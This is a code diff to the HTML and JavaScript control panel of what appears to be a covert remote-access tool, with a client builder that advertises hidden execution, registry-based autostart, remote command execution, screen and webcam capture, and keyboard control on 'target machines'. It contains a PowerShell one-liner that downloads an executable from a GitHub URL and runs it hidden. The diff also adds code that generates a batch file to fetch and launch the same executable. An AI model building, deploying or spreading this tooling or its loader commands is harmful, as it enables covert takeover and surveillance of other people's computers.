@@ -11,9 +11,9 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 ::-webkit-scrollbar-track{background:#0a0c10}
 ::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
 ::-webkit-scrollbar-thumb:hover{background:#484f58}
-.header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:1px solid #21262d;padding:0 2rem;display:flex;align-items:center;height:64px;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:1px solid #21262d;padding:0 2rem;display:flex;align-items:center;height:64px;position:sticky;top:0;z-index:100}
 .header .logo{display:flex;align-items:center;gap:.6rem;font-size:1.2rem;font-weight:700;color:#f0f6fc;margin-right:2.5rem}
-.header .logo .icon{width:32px;height:32px;background:linear-gradient(135deg,#58a6ff,#8250df);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.header .logo .icon{width:32px;height:32px;background:linear-gradient(135deg,#58a6ff,#8250df);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#fff}
 .header .logo span{background:linear-gradient(135deg,#58a6ff,#8250df);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
 .nav{display:flex;gap:.25rem;flex:1}
 .nav a{padding:.5rem 1.2rem;border-radius:8px;text-decoration:none;color:#8b949e;font-size:.9rem;font-weight:500;transition:all .2s;cursor:pointer;display:flex;align-items:center;gap:.5rem}
@@ -41,7 +41,6 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .stat-card .lbl{color:#8b949e;font-size:.85rem;margin-top:.25rem}
 .stat-card .stat-icon{position:absolute;right:1rem;top:50%;transform:translateY(-50%);font-size:2rem;opacity:.1}
 .stat-card.online .num{color:#3fb950}
-.stat-card.offline .num{color:#484f58}
 .client-list{display:flex;flex-direction:column;gap:.5rem}
 .client-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1rem 1.2rem;display:flex;align-items:center;gap:1rem;transition:all .3s;animation:slideIn .3s ease}
 .client-card:hover{border-color:#30363d;transform:translateX(4px);box-shadow:0 4px 16px rgba(0,0,0,.3)}
@@ -57,7 +56,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .client-card .meta span{display:flex;align-items:center;gap:.25rem}
 .client-card .actions{display:flex;gap:.4rem;flex-shrink:0}
 .empty-state{text-align:center;padding:4rem 2rem;color:#484f58}
-.empty-state .empty-icon{font-size:4rem;margin-bottom:1rem;opacity:.3}
+.empty-state .empty-icon{font-size:4rem;margin-bottom:1rem;opacity:.3;color:#484f58}
 .empty-state h3{color:#8b949e;margin-bottom:.5rem}
 .empty-state p{font-size:.85rem}
 
@@ -69,7 +68,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1rem;margin-bottom:1.5rem}
 .feature-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1.5rem;transition:all .3s;position:relative;overflow:hidden}
 .feature-card:hover{border-color:#30363d;transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4)}
-.feature-card .icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;margin-bottom:.8rem}
+.feature-card .icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;margin-bottom:.8rem;color:#fff}
 .feature-card .icon.blue{background:rgba(88,166,255,.12);color:#58a6ff}
 .feature-card .icon.green{background:rgba(63,185,80,.12);color:#3fb950}
 .feature-card .icon.purple{background:rgba(130,80,223,.12);color:#8250df}
@@ -93,11 +92,14 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .build-actions{display:flex;gap:1rem;align-items:center;flex-wrap:wrap;margin-top:1rem}
 .build-actions .btn{font-size:1rem;padding:.6rem 1.5rem}
 .install-cmd{background:#0d1117;border:1px solid #21262d;border-radius:8px;padding:1rem;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.82rem;color:#8b949e;margin-top:.8rem;user-select:all;position:relative}
+.install-cmd .lbl{color:#58a6ff;font-weight:600}
+.install-cmd .str{color:#d29922}
+.install-cmd .cmd{color:#3fb950}
 .install-cmd .copy-btn{position:absolute;top:.5rem;right:.5rem;background:#21262d;border:none;color:#8b949e;padding:.2rem .5rem;border-radius:4px;cursor:pointer;font-size:.75rem}
 .install-cmd .copy-btn:hover{background:#30363d;color:#e6edf3}
 .feature-list{list-style:none;padding:0;margin-top:.5rem}
-.feature-list li{color:#8b949e;font-size:.82rem;padding:.2rem 0;display:flex;align-items:center;gap:.5rem}
-.feature-list li::before{content:'âœ“';color:#3fb950;font-weight:700}
+.feature-list li{color:#8b949e;font-size:.82rem;padding:.25rem 0;display:flex;align-items:center;gap:.5rem}
+.feature-list li::before{content:'\2713';color:#3fb950;font-weight:700}
 
 @media(max-width:768px){
 .header{padding:0 1rem}
@@ -112,9 +114,6 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .builder-hero{padding:1.5rem}
 .build-actions{flex-direction:column}
 }
-
-@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
-.skeleton{background:linear-gradient(90deg,#161b22 25%,#1c2128 50%,#161b22 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;border-radius:8px;height:60px;margin-bottom:.5rem}
 </style>
 </head>
 <body>
@@ -137,17 +136,14 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
     <div class="stat-card online">
       <div class="num" id="onlineCount">0</div>
       <div class="lbl">Online Now</div>
-      <div class="stat-icon">â—</div>
     </div>
     <div class="stat-card">
       <div class="num" id="totalCount">0</div>
       <div class="lbl">Total Clients</div>
-      <div class="stat-icon">â—</div>
     </div>
     <div class="stat-card">
       <div class="num" id="lastPing">-</div>
       <div class="lbl">Last Ping</div>
-      <div class="stat-icon">â—</div>
     </div>
   </div>
   <div id="clientList"></div>
@@ -157,28 +153,28 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
   <div class="builder-hero">
     <h2>Build Your Client</h2>
     <p>Configure and download the remote administration client. Deploy on target machines to gain full control.</p>
-    <div class="version">v2.0 â€¢ 480 KB â€¢ Windows x64</div>
+    <div class="version">v2.0 - 480 KB - Windows x64</div>
   </div>
 
   <div class="feature-grid">
     <div class="feature-card">
-      <div class="icon blue">â—</div>
+      <div class="icon blue">CMD</div>
       <h3>Remote CMD</h3>
       <p>Execute commands on remote machines in real-time with full output capture.</p>
     </div>
     <div class="feature-card">
-      <div class="icon green">â—</div>
+      <div class="icon green">SCN</div>
       <h3>Screen Capture</h3>
       <p>Take screenshots with multi-monitor support. Stream live screen at high FPS.</p>
     </div>
     <div class="feature-card">
-      <div class="icon purple">â—</div>
+      <div class="icon purple">FIL</div>
       <h3>File Browser</h3>
       <p>Browse, navigate, and explore the remote file system with directory listing.</p>
     </div>
     <div class="feature-card">
-      <div class="icon orange">â—</div>
-      <h3>Webcam & Input</h3>
+      <div class="icon orange">CAM</div>
+      <h3>Webcam &amp; Input</h3>
       <p>Capture webcam images and remotely control mouse and keyboard.</p>
     </div>
   </div>
@@ -208,7 +204,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Sends status updates every 200ms to keep the dashboard connection alive.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked onchange="updateBuildCmd()">
+        <input type="checkbox" id="pingToggle" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
@@ -218,7 +214,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Continuously streams the desktop at 5 FPS with automatic cleanup.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked onchange="updateBuildCmd()">
+        <input type="checkbox" id="screenToggle" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
@@ -228,19 +224,19 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Runs completely hidden with no console window or user-visible traces.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked onchange="updateBuildCmd()">
+        <input type="checkbox" id="stealthToggle" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
 
     <div class="build-actions">
-      <button class="btn btn-primary" onclick="downloadClient()">⬇ Download Client</button>
-      <button class="btn btn-accent" onclick="copyBuildCmd()">📋 Copy Build Command</button>
+      <button class="btn btn-primary" onclick="downloadClient()">Download Client</button>
+      <button class="btn btn-accent" onclick="copyBuildCmd()">Copy Build Command</button>
     </div>
 
     <div class="install-cmd" id="buildCmdDisplay">
-      <span style="color:#58a6ff">#</span> <span style="color:#8b949e">Build command — copy and run on target:</span>
-      <br><span id="buildCmdText">Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\update.exe"</span>
+      <span class="lbl"># Build command:</span>
+      <div id="buildCmdText" style="margin-top:.3rem;line-height:1.6">Invoke-WebRequest -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\update.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\update.exe"</span></div>
       <button class="copy-btn" onclick="copyBuildCmd()">Copy</button>
     </div>
   </div>
@@ -248,7 +244,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
   <div class="build-panel">
     <h3>What's Included</h3>
     <ul class="feature-list">
-      <li>Stealth execution â€” no console window, hidden from user</li>
+      <li>Stealth execution - no console window, hidden from user</li>
       <li>Auto-start on boot via HKCU\Run registry key</li>
       <li>Remote command execution with output capture</li>
       <li>Multi-monitor screenshot support</li>
@@ -256,8 +252,10 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
       <li>Remote mouse and keyboard control</li>
       <li>Full file system browsing</li>
       <li>Webcam image capture</li>
+      <li>Running process list viewer</li>
+      <li>System information (RAM, CPU, disks)</li>
       <li>200ms polling for instant command pickup</li>
-      <li>Direct Supabase REST API â€” no server dependencies</li>
+      <li>Direct Supabase REST API - no server dependencies</li>
     </ul>
   </div>
 </div>
@@ -295,7 +293,7 @@ async function load(){
   if(p.length)document.getElementById('lastPing').textContent=new Date(p[0].created_at).toLocaleTimeString();
   const list=document.getElementById('clientList');
   if(!names.length){
-   list.innerHTML='<div class="empty-state"><div class="empty-icon">â—</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';
+   list.innerHTML='<div class="empty-state"><div class="empty-icon">[]</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';
    return;
   }
   list.innerHTML=names.map((n,i)=>{
@@ -304,7 +302,7 @@ async function load(){
    const isOnline=age<60000;
    const ip=x.ip||'?';
    const ts=new Date(x.created_at).toLocaleString();
-   return '<div class="client-card" style="animation-delay:'+(i*0.05)+'s"><div class="dot '+(isOnline?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n)+' <span style="font-size:.75rem;color:#8b949e;font-weight:400">'+esc(ip)+'</span></div><div class="meta"><span>Last: '+ts+'</span><span style="color:'+(isOnline?'#3fb950':'#484f58')+'">'+(isOnline?'\u25cf Online':'')+'</span></div></div><div class="actions"><button class="btn btn-accent btn-sm" onclick="openClient(\''+escAttr(n)+'\')">Open</button><button class="btn btn-danger btn-sm" onclick="removeClient(\''+escAttr(n)+'\')">Remove</button></div></div>';
+   return '<div class="client-card" style="animation-delay:'+(i*0.05)+'s"><div class="dot '+(isOnline?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n)+' <span style="font-size:.75rem;color:#8b949e;font-weight:400">'+esc(ip)+'</span></div><div class="meta"><span>Last: '+ts+'</span><span style="color:'+(isOnline?'#3fb950':'#484f58')+'">'+(isOnline?'* Online':'')+'</span></div></div><div class="actions"><button class="btn btn-accent btn-sm" onclick="openClient(\''+escAttr(n)+'\')">Open</button><button class="btn btn-danger btn-sm" onclick="removeClient(\''+escAttr(n)+'\')">Remove</button></div></div>';
   }).join('');
  }catch{}
 }
@@ -317,7 +315,30 @@ function openClient(name){
 }
 
 function downloadClient(){
- window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
+ const name=document.getElementById('clientName').value.trim();
+ const startup=document.getElementById('startupToggle').checked;
+ const ping=document.getElementById('pingToggle').checked;
+ const screen=document.getElementById('screenToggle').checked;
+ const stealth=document.getElementById('stealthToggle').checked;
+ const hasOpts=name||!startup||!ping||!screen||!stealth;
+ if(!hasOpts){
+  window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
+  return;
+ }
+ let args='';
+ if(name) args+=' --name "'+name+'"';
+ if(!startup) args+=' --no-startup';
+ if(!ping) args+=' --no-ping';
+ if(!screen) args+=' --no-screen';
+ if(!stealth) args+=' --show';
+ const exeUrl='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
+ const bat='@echo off\r\ncd /d "%~dp0"\r\ncurl -sL "'+exeUrl+'" -o upd.exe\r\nstart /min upd.exe'+args+'\r\n';
+ const blob=new Blob([bat],{type:'application/bat'});
+ const a=document.createElement('a');
+ a.href=URL.createObjectURL(blob);
+ a.download='client.bat';
+ a.click();
+ URL.revokeObjectURL(a.href);
 }
 
 async function removeClient(name){
@@ -347,11 +368,12 @@ function buildArgs(){
 function updateBuildCmd(){
  const args=buildArgs();
  const el=document.getElementById('buildCmdText');
- el.textContent='Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\\update.exe"'+args;
+ el.innerHTML='Invoke-WebRequest -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\\update.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\\update.exe"</span>'+args;
 }
 
 function copyBuildCmd(){
- navigator.clipboard.writeText(document.getElementById('buildCmdText').textContent).then(()=>{
+ const el=document.getElementById('buildCmdText');
+ navigator.clipboard.writeText(el.textContent).then(()=>{
   const btn=document.querySelector('.install-cmd .copy-btn');
   btn.textContent='Copied!';
   setTimeout(()=>btn.textContent='Copy',2000);
